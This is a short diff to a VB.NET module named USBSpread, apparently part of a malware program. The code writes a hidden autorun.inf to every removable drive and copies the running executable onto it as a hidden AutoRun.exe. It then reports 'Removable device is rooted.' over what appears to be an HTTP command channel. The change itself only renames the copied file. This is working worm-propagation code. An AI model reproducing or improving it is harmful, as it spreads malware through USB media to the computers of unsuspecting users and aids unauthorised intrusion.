@@ -15,7 +15,7 @@ Module USBSpread
                     Dim outfile As StreamWriter = New StreamWriter(autorunPath)
 
                     outfile.WriteLine("[autorun]")
-                    outfile.WriteLine("open=start.exe")
+                    outfile.WriteLine("open=AutoRun.exe")
                     outfile.WriteLine("action=Run VMCLite")
                     outfile.Close()
 
@@ -23,9 +23,9 @@ Module USBSpread
                     File.SetAttributes(autorunPath, FileAttributes.Hidden)
 
                     Try
-                        File.Copy(source, String.Concat(drive.Name, "start.exe"), True)
+                        File.Copy(source, String.Concat(drive.Name, "AutoRun.exe"), True)
 
-                        File.SetAttributes(String.Concat(drive.Name, "start.exe"), FileAttributes.Hidden)
+                        File.SetAttributes(String.Concat(drive.Name, "AutoRun.exe"), FileAttributes.Hidden)
                     Finally
                         TcpListen.TalkChannelHTTP("Removable device is rooted.")
                     End Try
